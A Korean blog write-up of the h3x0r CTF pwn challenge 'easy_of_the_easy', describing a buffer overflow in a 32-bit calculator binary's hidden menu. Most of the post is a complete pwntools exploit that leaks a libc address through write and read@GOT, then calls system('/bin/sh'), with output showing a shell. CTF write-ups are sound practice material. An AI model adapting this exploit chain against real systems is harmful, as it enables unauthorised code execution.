---
layout: post
title: ! "h3x0r CTF] easy_of_the_easy (pwn 300)
excerpt_separator: <!--more-->
tags:
  - CTF
  - Write-up
---

학기중에는 바빠서 H3x0r CTF에 참가하지 못했다. 그래서 종강한 뒤 여유가 생겨서 문제를 몇 개 풀어보고자 했다. 그런데 너무 오랫동안 포너블 문제를 풀지 않아서인가 계속 버벅대기에, 생각도 정리하고 나중에 참고할 수 있도록 블로그에 포스팅을 올리기로 결심하였다.

<!--more-->

> nc 49.236.136.140 14000
> [Download](https://h3x0r.kr/uploads/8/easy_of_the_easy)
>
> -Ho_9

문제가 매우 심플하다. 바이너리만 하나 던져준다.

> \#file easy_of_the_easy
>
> easy_of_the_easy: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=943b5012ebc31246a545435ea3a4336795a9bb8d, not stripped

확인해보면 32bit 바이너리인걸 알 수 있다.

분석해보면 단순한 계산기 프로그램이고, 일정 조건을 만족하면 special menu를 열어주어 BOF 취약점을 트리거할 수 있게 되어있다. canary도 안 걸려있다. (걸려있어도 해결 가능할 것 같긴 하지만) 문제 자체가 포너블의 sanity check 개념인듯 하다. wrtie, read함수가 보이니까 대충 BOF로 주소 leak 해서 쉘 따면 된다.

```python
from pwn import *

PROCESS = "./easy_of_the_easy"

First_gate_addr = 0x08048801
special_menu_addr = 0x080487a0
write_plt = 0x08048452
read_got = 0x0804a00c

r = process(PROCESS)

def main () :
	global system_addr
	global binsh_addr

	make_nbytes()
	r.recvuntil("Good Luck!")
	bof()

	data = r.recvline().strip()
	system_addr = u32(data) - 0x9ad60
	binsh_addr = system_addr + 0x120c6b

	log.info(hex(system_addr))
	log.info(hex(binsh_addr))
	
	givemeshell()

	r.interactive()

def make_nbytes() :
	r.sendline("1 245686 1")
	r.recvuntil("Menu")
	r.sendline("2 2 1")
	r.recvuntil("Menu")
	r.sendline("3 1 1")
	r.recvuntil("Menu")
	r.sendline("4 1 1")
	r.recvuntil("Menu")
	r.sendline("1 1 0")
	r.recvuntil("Menu")
	r.sendline("2 2 1")
	r.recvuntil("Menu")
	r.sendline("3 1 1")
	r.recvuntil("Menu")
	r.sendline("4 1 1")
	r.recvuntil("Menu")
	r.sendline("6")
	r.recvuntil("Menu")
	r.sendline("4 1 1") # go to hidden menu

def bof() :
	payload = "A"*18
	payload += "B"*4
	payload += p32(write_plt)
	payload += p32(special_menu_addr)
	payload += p32(0x01)
	payload += p32(read_got)
	# payload += p32(0x08048b48) # good
	payload += p32(0x04)
	r.sendline(payload)

def givemeshell() :
	payload = "A"*18
	payload += "B"*4
	payload += p32(system_addr)
	payload += "C"*4
	payload += p32(binsh_addr)
	payload += "D"*20
	r.sendline(payload)

if __name__ == '__main__' :
	main ()
```

> root@ubuntu:~/CTF/h3x0r/easy_of_the_easy\# python local_exploit.py 
> [\+] Starting local process './easy_of_the_easy': pid 5203
> [\*] 0xf7d72da0
> [\*] 0xf7e93a0b
>
> [\*] Switching to interactive mode
>
> ​            Secret           Way          
>
> ==========================================
>
> Good Luck!$ ls
> easy_of_the_easy  local_exploit.py
> $ 



bof 해줄때 32bit 오랜만이라 그런가.. write 함수 다음에 +@ ret 적어주는걸 까먹어서 이상한 오류가 뿜뿜!! 했다. 다음부터는 주의해야지.
